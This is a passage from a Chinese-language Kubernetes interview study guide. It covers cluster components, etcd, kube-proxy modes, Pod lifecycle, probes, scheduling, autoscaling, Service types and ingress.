
一个在集群中每个node上运行的代理。 它保证容器都 运行在 Pod 中。kubelet 定期接收新的或修改过的 pod 规范 PodSpecs（主要通过 kube-apiserver）并确保 pod 及容器健康并以所需状态运行。该组件还向 kube-apiserver 报告运行它的主机的健康状况。

kubelet 不会管理不是由 Kubernetes 创建的容器。

#### kube-proxy

[kube-proxy](https://link.juejin.cn?target=https%3A%2F%2Fkubernetes.io%2Fzh%2Fdocs%2Freference%2Fcommand-line-tools-reference%2Fkube-proxy%2F) 是集群中每个节点上运行的网络代理， 实现 Kubernetes 服务（Service） 概念的一部分。用于处理单个主机子网划分并向外部世界公开服务。它跨集群中的各种隔离网络将请求转发到正确的 pod/容器。

kube-proxy 维护节点上的网络规则。这些网络规则允许从集群内部或外部的网络会话与 Pod 进行网络通信。

如果操作系统提供了数据包过滤层并可用的话，kube-proxy 会通过它来实现网络规则。否则， kube-proxy 仅转发流量本身。

#### 容器运行时（Container Runtime）

容器运行时负责创建容器运行环境。

Kubernetes 支持多个容器运行时: Docker（即将被废弃）、containerd、CRI-O以及任何实现 [Kubernetes CRI (容器运行环境接口)](https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkubernetes%2Fcommunity%2Fblob%2Fmaster%2Fcontributors%2Fdevel%2Fsig-node%2Fcontainer-runtime-interface.md)的runtime。

## 简述etcd的特点

[etcd](https://link.segmentfault.com/?enc=cSp0zXno0dDKgL8d%2F5bkBw%3D%3D.R7PRqgxrexhiiLojVwYmEYnScKpTosO2ut8zkrWYOX43ef6GxXcCp%2BpMhnGxhJajRtVOsZaAVHYs2bpQ%2FblKWf2ZskW00yYEoirUrhP6IqpYwKizfgNG9wFX5eRMn4eLWs0FJXEHcJ3D0CChz3rlrgMEg7iozy34us7MewrP%2Bagt9NCX4yZekqgj%2FI4xUCk7%2BulXVPkzCVnSr7YIFO16xT8FPUMFPGNQqXkV2QSnIabow8vzZ52nnsuAfcp%2BXv%2BfNr9uDhhp4NsPichPr2JJl9ePN5%2BGo1Ej%2Fe9an3fiCkv3TM3JfFLlZ1qZfQyyjKqP) 是 CoreOS 团队发起的开源项目，是一个管理配置信息和服务发现（service discovery）的项目，它的目标是构建一个高可用的分布式键值（key-value）数据库，基于 Go 语言实现。

- 特点：
- 简单：支持 REST 风格的 HTTP+JSON API
- 安全：支持 HTTPS 方式的访问
- 快速：支持并发 1k/s 的写操作
- 可靠：支持分布式结构，基于 Raft 的一致性算法，Raft 是一套通过选举主节点来实现分布式系统一致性的算法。

## 简述ETCD适应的场景？

[etcd](https://link.segmentfault.com/?enc=u3DU1zxoW2mFnHDX%2B6Bh4g%3D%3D.3uIi937CsjLhDzj3ZlZFcXeIwDmspAOBDSXsDYFn%2F8QOC4BGAbOJrdES36NRuI%2FNiI6MNydSvSuZLSW%2B7ya2Dvd6v6QZnXzPd4rKOMtyvkkWWTaXMYKsXmwiL6dUgrriyh6ixIX0bXEjXbtH5RsgP5CQargumECZV6ZtsJNU41TKeOoagR25MpolPNMhPQ2RmKGkSmyVUBPj8tc8eDi%2B0UJEE2AfJnT8z6rIA2sNdIoS9R4jWK0oTCN92cicoRHC%2BXqhQRbglppCtESOq6VptAkjHcbKPB9GCSAL79kQKhBGTznJOJalm4WDin3cxwKC)基于其优秀的特点，可广泛的应用于以下场景：

服务发现(Service Discovery)：服务发现主要解决在同一个分布式集群中的进程或服务，要如何才能找到对方并建立连接。本质上来说，服务发现就是想要了解集群中是否有进程在监听udp或tcp端口，并且通过名字就可以查找和连接。

消息发布与订阅：在分布式系统中，最适用的一种组件间通信方式就是消息发布与订阅。即构建一个配置共享中心，数据提供者在这个配置中心发布消息，而消息使用者则订阅他们关心的主题，一旦主题有消息发布，就会实时通知订阅者。通过这种方式可以做到分布式系统配置的集中式管理与动态更新。应用中用到的一些配置信息放到etcd上进行集中管理。

负载均衡：在分布式系统中，为了保证服务的高可用以及数据的一致性，通常都会把数据和服务部署多份，以此达到对等服务，即使其中的某一个服务失效了，也不影响使用。etcd本身分布式架构存储的信息访问支持负载均衡。etcd集群化以后，每个etcd的核心节点都可以处理用户的请求。所以，把数据量小但是访问频繁的消息数据直接存储到etcd中也可以实现负载均衡的效果。

分布式通知与协调：与消息发布和订阅类似，都用到了etcd中的Watcher机制，通过注册与异步通知机制，实现分布式环境下不同系统之间的通知与协调，从而对数据变更做到实时处理。

分布式锁：因为etcd使用Raft算法保持了数据的强一致性，某次操作存储到集群中的值必然是全局一致的，所以很容易实现分布式锁。锁服务有两种使用方式，一是保持独占，二是控制时序。

集群监控与Leader竞选：通过etcd来进行监控实现起来非常简单并且实时性强。

## 简述Kubernetes和Docker的关系？

Docker 提供容器的生命周期管理和，[Docker](https://link.segmentfault.com/?enc=UVIS8wCpUVSyQgcyUgTQQg%3D%3D.fHyDdJJJVjXzq873pKRR5HgTCj%2Bg6rW8JDQPw2B3oqNSqy4PJDW15j7539WX4%2FHB25DQyz5A0mkDF7kq%2Fi0DG2fy43OS44nPEBiDElS3bZ7jxLAXMWyN3uFZsi4FnhbaH3r13sJYOsNC5qB4aYzHRBGLZqvqsNTzi9YJYW1qDttchn8EqQXluQXN3D3dUDlXcE3TzequvHF6GNbuAeK7woV2gtYummlRQUssw3fzq0IIVhHgLhSsvfoKUJDCTvDDWAYU5UWndcSxPXR0esVFuQ35juAe9ljYkBbvHxWZGFNHv0bZ%2BPH9Sr%2B5wI1ZySQS) 镜像构建运行时容器。它的主要优点是将将软件/应用程序运行所需的设置和依赖项打包到一个容器中，从而实现了可移植性等优点。

[Kubernetes](https://link.segmentfault.com/?enc=unHJYjk0bn4g9bgEddISBw%3D%3D.q4emsEJYT0dRVk9H%2BtN0aG%2FqX0iQPR9ze%2FcPyEIvxhn9nKCpd36%2F5uawRLZ53flkBhdniklTYU1K%2F5JQxbAHYljhv%2F9DsHscUnaIOlMwerGbaP%2FoFxB0kc9F7uwwZ%2FnUXNnYHUZfvO74nO5eI3xBkCDXrDgm5V1PLeYlhN1djP5KRl0LerwMwgk4obyYiguit2ok7Pn%2Bs1AO1RwR16nMFEENe%2F%2FqaFBttSstXGsmF9BzfTxjD858k7JqLdqXlIDeNoIMyrpZqVh6czOkef%2FvmVSWNYt3ltGM3FwCYHjUNnPBkEQ5Cs6QT2eWIEcyimMv) 用于关联和编排在多个主机上运行的容器。

## 简述Kubernetes中什么是Minikube、Kubectl、Kubelet？

Minikube 是一种可以在本地轻松运行一个单节点 [Kubernetes](https://link.segmentfault.com/?enc=EHWBJdoWC7BtTMPSitLzPw%3D%3D.ZcgfhaYQ7yKTHMxZ4f2NB7V28q4xC0PbJolOocVCNgQ71%2FaVx1TWS4BSBIQ3ihvdkZHIQItuD201%2B3lkjKLEJYHWC0aJPLLPyYTlsrnhIvdFsWuze5B%2Ffi3yomqLi8WE%2BpYVBofNASxpWf4pNbBfWupk0OECk5TjKJ6Pp38e4JExSqLqS1rtXOsmheO4W9rWU7LCwuh7JgksV2ScUrTQROTp0p%2BR%2FeCWMIU%2FAyAQhoPv%2BT0r1qBRWzPci2wlyK09jtLmRoGq561vXt8laj71M9eTZEcmknMYiLP0nopZOOpxsYD1W3QY7TfJF0Ubu6oK) 群集的工具。

[Kubectl](https://link.segmentfault.com/?enc=FkvCPsgaignZ1zH5yNk%2Bow%3D%3D.oLmgRa31U9Gj1spn8TGmewWrRKOGf%2BqHgv8AIkFanD0LhF%2BZSdiCsMHRu3EsmR4QnjSr3mWioyx7xen1iHIO8NAgYUGVCjS3hqqqeaC9Q5vm%2FvKZWetfPMP%2BdSMw8eEC2QzuZtConXx3QyJya%2Fo%2B1fDdVn8bk73gEHk1GnR29xjR%2FpXbOWz%2BPOhRzww5b2dNKRVXQJIWnR%2F7y%2B61l7%2F9PQ8iB52LONjC1KyYpY9TipNP8dqMPpPCUqusUqvoOsDtNfhMMS8261VnG3P2Ylg64q5raMJDtPSRWELPvhkFNuBoZYdau5VDhyzKDySFLvbl) 是一个命令行工具，可以使用该工具控制[Kubernetes](https://link.segmentfault.com/?enc=b64r68SYf2Gz4XL2en%2FXXw%3D%3D.6zbPVo1y%2BP7bD36vi9l%2BPjNwQ1oif%2BPNNjWS6PQ2mqDgQiaiDhFcck0QBaJtPtyYcd70merR98FQuT7gYT0IjpedIdxmCf6SvUoY%2BjgrbEga06uW%2FXxoprBqxz0t1MqjUdFHng506zINCYLkj%2FVSslOGRqCVpLsIgB%2BV0fTorHHGtn3sv7qsmdRwSV8cEdv%2F6wlPom5lLRLvgpJkTilucMk8Z51i974Q%2FNJQ2pHV2I8rLqlB0Afn69HwspG4l%2Fk5EDogPDjlTAG1QROe%2BFRe%2FldHkztZRcInuo3OAeu00wFHAKHZTIE7PugYOnHAEM1B)集群管理器，如检查群集资源，创建、删除和更新组件，查看应用程序。

Kubelet 是一个代理服务，它在每个节点上运行，并使从服务器与主服务器通信。

## 简述Kubernetes的优势、适应场景及其特点？

[Kubernetes](https://link.segmentfault.com/?enc=INN0faIsgJKWlm%2BcWIRg%2Bg%3D%3D.whqSVIFW8S%2BfVGOf79sVdGoOw2k7Vxi6Nnadyre4r%2BMUJ8%2FjqMf3OVdC4YmoCQB6%2FOFWp8H70gI7J147T7GAi4Ay%2BCj0oBziciE5mTBUVgpRDV6t5Jmm1kxnCnzvlSi5arCU6cDSZbFjU%2BQFWyW8oLvSwwo48R0Kx3L1vE3%2BjdHi2uKszijkZGD5wAwqz0Fwq0GlViNQVrbExrTW9dClk0%2FPUcDmj5yjhkEBaWxspunAdqvHBQh53%2FIEre4uKU%2B9E1jPCdhDybLg4dpZcYmGBnaQfvqQyFr2TbPltPHQxM%2F2J2Bl4HeR4I2%2BWr6hbPYI)作为一个完备的分布式系统支撑平台，其主要优势：

- 容器编排
- 轻量级
- 开源
- 弹性伸缩
- 负载均衡

[Kubernetes](https://link.segmentfault.com/?enc=W5L2ix1r9T%2BxgJ9MXWx3fA%3D%3D.CGdqVLn3YdE6Wpxa4uTsGqtnuhju28IL%2BAFq45nqpDSMdv4C99nz%2FtFxFCQ9sz1u7Ka9kuRyymhxVjcN0ZGMCDG4shQrF3D%2F%2B2dAE%2BrKlMASNZFdQf2twOyOnmMtVajSDyAtmpwTtV%2FcqnWPeKSB3oLChkRQWFd86YFd%2ByIpBkPHMzSA01EAmlmAvC8MNYLtH6wYQ8PY1nqdtohyE1co2EaiDKxofdZvaFmCHxqBPMwwPNAnFNE2XM41UP1b0JUdEi9poNhSEgpb62MyWAnKRff95XHlxd8sgOSHAOhAB0Zg5ClKm5fiYm9XXBnntt3p)常见场景：

- 快速部署应用
- 快速扩展应用
- 无缝对接新的应用功能
- 节省资源，优化硬件资源的使用

Kubernetes相关特点：

- 可移植: 支持公有云、私有云、混合云、多重云（multi-cloud）。
- 可扩展: 模块化,、插件化、可挂载、可组合。
- 自动化: 自动部署、自动重启、自动复制、自动伸缩/扩展。

## 简述Kubernetes相关基础概念？

master：[k8s集群](https://link.segmentfault.com/?enc=OWajuu9queA89%2FlAbYuWdQ%3D%3D.VPnULZMgi09YZtKDt317qcj8RF4hQzJN9mm5zbbr4rYkvJcbSbE7095%2FitJDFaaAS6HPusaL5EMranSJDRIHYhpIuTZCXp0PRMNs%2BjK3kLbL0wKappJR4Y%2Bv1eL92iONNEj0iB5GwFIuLSuoiaymUCQ3F41ckZrNJZyuUb6lIPGszdlk0XhBH7RbL0u1wlqJy56J6OOabikjdNGieD%2BfC3JXJ4pSAjTKVA5EkFMbp6%2FI24Fr9hxSq9vuqfNue9zbHeA1B%2BGhBxZixL0P6hdPndSROca6Cyf7MLwIOkkgxwHyxiFuXcl4FUXY%2FMYzYQI4)的管理节点，负责管理集群，提供集群的资源数据访问入口。拥有Etcd存储服务（可选），运行Api Server进程，Controller Manager服务进程及Scheduler服务进程。

node（worker）：Node（worker）是Kubernetes集群架构中运行Pod的服务节点，是Kubernetes集群操作的单元，用来承载被分配Pod的运行，是Pod运行的宿主机。运行docker eninge服务，守护进程kunelet及负载均衡器kube-proxy。

pod：运行于Node节点上，若干相关容器的组合([Kubernetes 之 Pod 实现原理](https://link.segmentfault.com/?enc=DG0ZVCQbB8%2FVmQXx2pxQrQ%3D%3D.dmFSjX0EluP3QRU6dDo3NyO9tMF%2Bgd2a2KOb92TPh%2BZFs4oRmiTorQIfBMFwL8EOte19mBiaWrE%2FQNFi%2B07tubRDAwvDeSOShN%2BmyI8CjshdKqoQe6PBWau9Z6Ir5rxywudY5TpGvJktA0eeKpqWZdaPhe5ksI1Wfxv1yttUpwzHrF3zP0fLFZO4k2M6p38MFOxv1OMvTfgybZ6jvgMbUQJLlXnwCoTelOcRlTlGwr8ce7VrM%2FDai8dBUu1V9J7lYzjaDqXVojESKaOlGmR3wwm%2BXP%2B9wuTiamHAZYzVZQvy81R7aiNzjS%2BaajZNLICK))。Pod内包含的容器运行在同一宿主机上，使用相同的网络命名空间、IP地址和端口，能够通过localhost进行通信。Pod是[Kurbernetes](https://link.segmentfault.com/?enc=eHb%2FiIj23QKrzbvYWFRICg%3D%3D.lLAHJZ3TItkjZy58XTXm5ayO2a39ZGJAP6WLc4IPt9IOfoU%2BhPbch968UTjghM%2B9%2Bu0JFV79sqlgYz6ew8amo0F98%2BpJCcwDHt%2FCS7z5mr8TPS5UGbKfCsD%2FceUDe1kUcE8QMoufP3CLkr36Qk3gIkZKyjSbWbhr1THnWuwyjNgZk%2FvSQi2I28LJWmOnI3igTaxYpjKmaKPSzxLtTxDTd4u49zT0ZH%2Bj%2F63MwUp5NZTO%2F9n578u1knEd6hT%2FecNhwna9DXAm9oW871gNKFIm6gTg74%2FMWg8er6BqcujR51VwwtdwU1AgYrsbAFAjWdee)进行创建、调度和管理的最小单位，它提供了比容器更高层次的抽象，使得部署和管理更加灵活。一个Pod可以包含一个容器或者多个相关容器。

label：[Kubernetes](https://link.segmentfault.com/?enc=awm9sv7kq%2Bj%2FUmfVGwmmgA%3D%3D.mGKu6SV6zmfOPBPmf6BJebnIjTzxG5Bv3hODOHHdDL49m%2B88f3HV%2F%2B2FQZuHL5yBtP4zVlL6uj9ODyYcaEi2mgHbRQ6srayxZxab0u6OKEO3jZ6jATqYeJWikeh08DXGv1m4CnoR0I8TELFiqKOeW3a%2FY6GAucmiQvBWRKhJJKzoiiK7kG6%2FWwDDaMzIeGYp2ZbE3wCySmcK6%2BJ4tEdXyK%2FklfiTokj0r0smvKR4PrScIWjod8JtZBt1FwhmP7S8F%2B917yPVls8pQyG5GCd7rjlxSDQyoQODQD2TGyvTELUgO1ijmSjNVYnpcqpmBMhD)中的Label实质是一系列的Key/Value键值对，其中key与value可自定义。Label可以附加到各种资源对象上，如Node、Pod、Service、RC等。一个资源对象可以定义任意数量的Label，同一个Label也可以被添加到任意数量的资源对象上去。Kubernetes通过Label Selector（标签选择器）查询和筛选资源对象。

Replication Controller：Replication Controller用来管理Pod的副本，保证集群中存在指定数量的Pod副本。集群中副本的数量大于指定数量，则会停止指定数量之外的多余容器数量。反之，则会启动少于指定数量个数的容器，保证数量不变。Replication Controller是实现弹性伸缩、动态扩容和滚动升级的核心。

Deployment：Deployment在内部使用了RS来实现目的，Deployment相当于RC的一次升级，其最大的特色为可以随时获知当前Pod的部署进度。

HPA（Horizontal Pod Autoscaler）：Pod的横向自动扩容，也是Kubernetes的一种资源，通过追踪分析RC控制的所有Pod目标的负载变化情况，来确定是否需要针对性的调整Pod副本数量。

Service：Service([Kubernetes 之服务发现](https://link.segmentfault.com/?enc=eHgCJtUYDzdeYKFFdWlnDw%3D%3D.kdG99%2FqF4TT0mcMhjzkV96uRV1kRW4V%2F1Ryx7YvZ1x2q8LHPsnDwbavpuSgP9Gy24NBxUVvb7lbx4ZFOTyKgjrv0GaYsqlTADPYPn0r7jqR8b7OUGX8owx7zZKe2UTe1BwdguQN2hU3VZ318CigVLBPEiDZLzWIPyAEtR0fQ2W2Eo8xwnp1%2BEDG44Uuag8phxFp5CsKRSZp%2FkVTEGzbn3CXYENBveyhBtjMhb2LA%2FVvDB8acHL9zTi06jJ%2FmyibxtVCvsQgHWwdhi63lupEacdkrZv9cXhFsW2v7RaEjgIfMrsFQiNqNrF6bV3H4%2Fer9))定义了Pod的逻辑集合和访问该集合的策略，是真实服务的抽象。Service提供了一个统一的服务访问入口以及服务代理和发现机制，关联多个相同Label的Pod，用户不需要了解后台Pod是如何运行。

Volume：Volume是Pod中能够被多个容器访问的共享目录，[Kubernetes](https://link.segmentfault.com/?enc=zZ%2FUhq8l%2F%2BpxfnDCk6GBDw%3D%3D.F4Jzle%2Fv%2BAMgkZLYTQmQe6DpusLjU83r9T9XCYgb%2FBi536TXCuNpTEnBJdxChkwP0iQY7TaHiIOYpH5stOBzoL%2FdlyUgHdOAhFthP1%2FTndJ3PD8f1LsKuNvGYnfFT7OBB%2BtRq%2F2OpnCgMPSZlDOummzy%2BKayKNQdcyFEcVsZFlRnNB0WmuIEwNDZS5wUP65K%2BoOPmhVMaMhlY14pcTjL8UcotoYLFobmQgfw7AR%2FQgtmXtko8XBKL4gG32CnfrmRUnDId%2FZrJRlQlIpJb%2BJvU6s%2FENFiwGV1EDRXGl8yWY0paivPsY4A3EQ7sI%2B0N3C%2F)中的Volume是定义在Pod上，可以被一个或多个Pod中的容器挂载到某个目录下。

Namespace：Namespace用于实现多租户的资源隔离，可将集群内部的资源对象分配到不同的Namespace中，形成逻辑上的不同项目、小组或用户组，便于不同的Namespace在共享使用整个集群的资源的同时还能被分别管理。

## 简述Kubernetes集群相关组件？

[Kubernetes](https://link.segmentfault.com/?enc=Vq3QkHS6%2BTZisJj1ZnbHjA%3D%3D.J2OdAEr%2FDf3axa41d5AD7Gn%2BlPksQj%2BfoEoeWcEQ46QNMpnQuCioysDyJndpg7Jdo1HozgmOYUWlZC2ps2dtkd1gtBPWFODgpgrudWFHAmWLiOieaHQip0Po0atx%2F3t6ZTj0XtPc0idBRXKSAQp5TRVm5QeKsrC91faqbzdlk7JxHBx5dcULtLNC8Ox5Z2hf9N9QJfauaX8p9t4SvY821CyK80d5eEGX0w%2BesxswOx4JpClgP1AIwRza6%2FDY%2Frhx5nEd9slpcctT4E9ByEr8mG1TiYcvf0xrKCNAzT%2F9yXw3SOyuzFHWXmUzPitxRo4y) Master控制组件，调度管理整个系统（集群），包含如下组件:

Kubernetes API Server：作为Kubernetes系统的入口，其封装了核心对象的增删改查操作，以RESTful API接口方式提供给外部客户和内部组件调用，集群内各个功能模块之间数据交互和通信的中心枢纽。

Kubernetes Scheduler：为新建立的Pod进行节点(node)选择(即分配机器)，负责集群的资源调度。

Kubernetes Controller：负责执行各种控制器，目前已经提供了很多控制器来保证Kubernetes的正常运行。

Replication Controller：管理维护Replication Controller，关联Replication Controller和Pod，保证Replication Controller定义的副本数量与实际运行Pod数量一致。

Node Controller：管理维护Node，定期检查Node的健康状态，标识出(失效|未失效)的Node节点。

Namespace Controller：管理维护Namespace，定期清理无效的Namespace，包括Namesapce下的API对象，比如Pod、Service等。

Service Controller：管理维护Service，提供负载以及服务代理。

EndPoints Controller：管理维护Endpoints，关联Service和Pod，创建Endpoints为Service的后端，当Pod发生变化时，实时更新Endpoints。

Service Account Controller：管理维护Service Account，为每个Namespace创建默认的Service Account，同时为Service Account创建Service Account Secret。

Persistent Volume Controller：管理维护Persistent Volume和Persistent Volume Claim，为新的Persistent Volume Claim分配Persistent Volume进行绑定，为释放的Persistent Volume执行清理回收。

Daemon Set Controller：管理维护Daemon Set，负责创建Daemon Pod，保证指定的Node上正常的运行Daemon Pod。

Deployment Controller：管理维护Deployment，关联Deployment和Replication Controller，保证运行指定数量的Pod。当Deployment更新时，控制实现Replication Controller和Pod的更新。

Job Controller：管理维护Job，为Jod创建一次性任务Pod，保证完成Job指定完成的任务数目

Pod Autoscaler Controller：实现Pod的自动伸缩，定时获取监控数据，进行策略匹配，当满足条件时执行Pod的伸缩动作。

## 简述Kubernetes RC的机制？

Replication Controller用来管理Pod的副本，保证集群中存在指定数量的Pod副本。当定义了RC并提交至Kubernetes集群中之后，Master节点上的Controller Manager组件获悉，并同时巡检系统中当前存活的目标Pod，并确保目标Pod实例的数量刚好等于此RC的期望值，若存在过多的Pod副本在运行，系统会停止一些Pod，反之则自动创建一些Pod。

简述Kubernetes Replica Set 和 Replication Controller 之间有什么区别？Replica Set 和 Replication Controller 类似，都是确保在任何给定时间运行指定数量的 Pod 副本。不同之处在于RS 使用基于集合的选择器，而 Replication Controller 使用基于权限的选择器。

## 简述kube-proxy作用？

kube-proxy 运行在所有节点上，它监听 apiserver 中 service 和 endpoint 的变化情况，创建路由规则以提供服务 IP 和负载均衡功能。简单理解此进程是Service的透明代理兼负载均衡器，其核心功能是将到某个Service的访问请求转发到后端的多个Pod实例上。

## 简述kube-proxy iptables原理？

Kubernetes从1.2版本开始，将iptables作为kube-proxy的默认模式。iptables模式下的kube-proxy不再起到Proxy的作用，其核心功能：通过API Server的Watch接口实时跟踪Service与Endpoint的变更信息，并更新对应的iptables规则，Client的请求流量则通过iptables的NAT机制“直接路由”到目标Pod。

## 简述kube-proxy ipvs原理？

IPVS在Kubernetes1.11中升级为GA稳定版。IPVS则专门用于高性能负载均衡，并使用更高效的数据结构（Hash表），允许几乎无限的规模扩张，因此被kube-proxy采纳为最新模式。

在IPVS模式下，使用iptables的扩展ipset，而不是直接调用iptables来生成规则链。iptables规则链是一个线性的数据结构，ipset则引入了带索引的数据结构，因此当规则很多时，也可以很高效地查找和匹配。

可以将ipset简单理解为一个IP（段）的集合，这个集合的内容可以是IP地址、IP网段、端口等，iptables可以直接添加规则对这个“可变的集合”进行操作，这样做的好处在于可以大大减少iptables规则的数量，从而减少性能损耗。

## 简述kube-proxy ipvs和iptables的异同？

iptables与IPVS都是基于Netfilter实现的，但因为定位不同，二者有着本质的差别：iptables是为防火墙而设计的；IPVS则专门用于高性能负载均衡，并使用更高效的数据结构（Hash表），允许几乎无限的规模扩张。

与iptables相比，IPVS拥有以下明显优势：

- 1、为大型集群提供了更好的可扩展性和性能；
- 2、支持比iptables更复杂的复制均衡算法（最小负载、最少连接、加权等）；
- 3、支持服务器健康检查和连接重试等功能；
- 4、可以动态修改ipset的集合，即使iptables的规则正在使用这个集合。

## 简述Kubernetes中什么是静态Pod？

静态pod是由kubelet进行管理的仅存在于特定Node的Pod上，他们不能通过API Server进行管理，无法与ReplicationController、Deployment或者DaemonSet进行关联，并且kubelet无法对他们进行健康检查。静态Pod总是由kubelet进行创建，并且总是在kubelet所在的Node上运行。

## 简述Kubernetes中Pod可能位于的状态？

Pending：API Server已经创建该Pod，且Pod内还有一个或多个容器的镜像没有创建，包括正在下载镜像的过程。

Running：Pod内所有容器均已创建，且至少有一个容器处于运行状态、正在启动状态或正在重启状态。

Succeeded：Pod内所有容器均成功执行退出，且不会重启。

Failed：Pod内所有容器均已退出，但至少有一个容器退出为失败状态。

Unknown：由于某种原因无法获取该Pod状态，可能由于网络通信不畅导致。

## 简述Kubernetes创建一个Pod的主要流程？

Kubernetes中创建一个Pod涉及多个组件之间联动，主要流程如下：

- 1、客户端提交Pod的配置信息（可以是yaml文件定义的信息）到kube-apiserver。
- 2、Apiserver收到指令后，通知给controller-manager创建一个资源对象。
- 3、Controller-manager通过api-server将pod的配置信息存储到ETCD数据中心中。
- 4、Kube-scheduler检测到pod信息会开始调度预选，会先过滤掉不符合Pod资源配置要求的节点，然后开始调度调优，主要是挑选出更适合运行pod的节点，然后将pod的资源配置单发送到node节点上的kubelet组件上。
- 5、Kubelet根据scheduler发来的资源配置单运行pod，运行成功后，将pod的运行信息返回给scheduler，scheduler将返回的pod运行状况的信息存储到etcd数据中心。

## 简述Kubernetes中Pod的重启策略？

Pod重启策略（RestartPolicy）应用于Pod内的所有容器，并且仅在Pod所处的Node上由kubelet进行判断和重启操作。当某个容器异常退出或者健康检查失败时，kubelet将根据RestartPolicy的设置来进行相应操作。

Pod的重启策略包括Always、OnFailure和Never，默认值为Always。

- Always：当容器失效时，由kubelet自动重启该容器；
- OnFailure：当容器终止运行且退出码不为0时，由kubelet自动重启该容器；
- Never：不论容器运行状态如何，kubelet都不会重启该容器。

同时Pod的重启策略与控制方式关联，当前可用于管理Pod的控制器包括ReplicationController、Job、DaemonSet及直接管理kubelet管理（静态Pod）。

不同控制器的重启策略限制如下：

- RC和DaemonSet：必须设置为Always，需要保证该容器持续运行；
- Job：OnFailure或Never，确保容器执行完成后不再重启；
- kubelet：在Pod失效时重启，不论将RestartPolicy设置为何值，也不会对Pod进行健康检查。

## 简述Kubernetes中Pod的健康检查方式？

对Pod的健康检查可以通过两类探针来检查：LivenessProbe和ReadinessProbe。

LivenessProbe探针：用于判断容器是否存活（running状态），如果LivenessProbe探针探测到容器不健康，则kubelet将杀掉该容器，并根据容器的重启策略做相应处理。若一个容器不包含LivenessProbe探针，kubelet认为该容器的LivenessProbe探针返回值用于是“Success”。

ReadineeProbe探针：用于判断容器是否启动完成（ready状态）。如果ReadinessProbe探针探测到失败，则Pod的状态将被修改。Endpoint Controller将从Service的Endpoint中删除包含该容器所在Pod的Eenpoint。

startupProbe探针：启动检查机制，应用一些启动缓慢的业务，避免业务长时间启动而被上面两类探针kill掉。

## 简述Kubernetes Pod的LivenessProbe探针的常见方式？

kubelet定期执行LivenessProbe探针来诊断容器的健康状态，通常有以下三种方式：

ExecAction：在容器内执行一个命令，若返回码为0，则表明容器健康。

TCPSocketAction：通过容器的IP地址和端口号执行TCP检查，若能建立TCP连接，则表明容器健康。

HTTPGetAction：通过容器的IP地址、端口号及路径调用HTTP Get方法，若响应的状态码大于等于200且小于400，则表明容器健康。

## 简述Kubernetes Pod的常见调度方式？

Kubernetes中，Pod通常是容器的载体，主要有如下常见调度方式：

- Deployment或RC：该调度策略主要功能就是自动部署一个容器应用的多份副本，以及持续监控副本的数量，在集群内始终维持用户指定的副本数量。
- NodeSelector：定向调度，当需要手动指定将Pod调度到特定Node上，可以通过Node的标签（Label）和Pod的nodeSelector属性相匹配。
- NodeAffinity亲和性调度：亲和性调度机制极大的扩展了Pod的调度能力，目前有两种节点亲和力表达：
- requiredDuringSchedulingIgnoredDuringExecution：硬规则，必须满足指定的规则，调度器才可以调度Pod至Node上（类似nodeSelector，语法不同）。
- preferredDuringSchedulingIgnoredDuringExecution：软规则，优先调度至满足的Node的节点，但不强求，多个优先级规则还可以设置权重值。
- Taints和Tolerations（污点和容忍）：
- Taint：使Node拒绝特定Pod运行；
- Toleration：为Pod的属性，表示Pod能容忍（运行）标注了Taint的Node。

## 简述Kubernetes初始化容器（init container）？

init container的运行方式与应用容器不同，它们必须先于应用容器执行完成，当设置了多个init container时，将按顺序逐个运行，并且只有前一个init container运行成功后才能运行后一个init container。当所有init container都成功运行后，Kubernetes才会初始化Pod的各种信息，并开始创建和运行应用容器。

## 简述Kubernetes自动扩容机制？

Kubernetes使用Horizontal Pod Autoscaler（HPA）的控制器实现基于CPU使用率进行自动Pod扩缩容的功能。HPA控制器周期性地监测目标Pod的资源性能指标，并与HPA资源对象中的扩缩容条件进行对比，在满足条件时对Pod副本数量进行调整。

- HPA原理

Kubernetes中的某个Metrics Server（Heapster或自定义Metrics Server）持续采集所有Pod副本的指标数据。HPA控制器通过Metrics Server的API（Heapster的API或聚合API）获取这些数据，基于用户定义的扩缩容规则进行计算，得到目标Pod副本数量。

当目标Pod副本数量与当前副本数量不同时，HPA控制器就向Pod的副本控制器（Deployment、RC或ReplicaSet）发起scale操作，调整Pod的副本数量，完成扩缩容操作。

## 简述Kubernetes Service类型？

通过创建Service，可以为一组具有相同功能的容器应用提供一个统一的入口地址，并且将请求负载分发到后端的各个容器应用上。其主要类型有：

- ClusterIP：虚拟的服务IP地址，该地址用于Kubernetes集群内部的Pod访问，在Node上kube-proxy通过设置的iptables规则进行转发；
- NodePort：使用宿主机的端口，使能够访问各Node的外部客户端通过Node的IP地址和端口号就能访问服务；
- LoadBalancer：使用外接负载均衡器完成到服务的负载分发，需要在spec.status.loadBalancer字段指定外部负载均衡器的IP地址，通常用于公有云。

## 简述Kubernetes Service分发后端的策略？

Service负载分发的策略有：RoundRobin和SessionAffinity

- RoundRobin：默认为轮询模式，即轮询将请求转发到后端的各个Pod上。
- SessionAffinity：基于客户端IP地址进行会话保持的模式，即第1次将某个客户端发起的请求转发到后端的某个Pod上，之后从相同的客户端发起的请求都将被转发到后端相同的Pod上。

## 简述Kubernetes Headless Service？

在某些应用场景中，若需要人为指定负载均衡器，不使用Service提供的默认负载均衡的功能，或者应用程序希望知道属于同组服务的其他实例。Kubernetes提供了Headless Service来实现这种功能，即不为Service设置ClusterIP（入口IP地址），仅通过Label Selector将后端的Pod列表返回给调用的客户端。

## 简述Kubernetes ingress？

Kubernetes的Ingress资源对象，用于将不同URL的访问请求转发到后端不同的Service，以实现HTTP层的业务路由机制。

Kubernetes使用了Ingress策略和Ingress Controller，两者结合并实现了一个完整的Ingress负载均衡器。使用Ingress进行负载分发时，Ingress Controller基于Ingress规则将客户端请求直接转发到Service对应的后端Endpoint（Pod）上，从而跳过kube-proxy的转发功能，kube-proxy不再起作用，全过程为：ingress controller + ingress 规则 ----> services。

同时当Ingress Controller提供的是对外服务，则实际上实现的是边缘路由器的功能。

## 简述Kubernetes各模块如何与API Server通信？

Kubernetes API Server作为集群的核心，负责集群各功能模块之间的通信。集群内的各个功能模块通过API Server将信息存入etcd，当需要获取和操作这些数据时，则通过API Server提供的REST接口（用GET、LIST或WATCH方法）来实现，从而实现各模块之间的信息交互。

如kubelet进程与API Server的交互：每个Node上的kubelet每隔一个时间周期，就会调用一次API Server的REST接口报告自身状态，API Server在接收到这些信息后，会将节点状态信息更新到etcd中。

如kube-controller-manager进程与API Server的交互：kube-controller-manager中的Node Controller模块通过API Server提供的Watch接口实时监控Node的信息，并做相应处理。

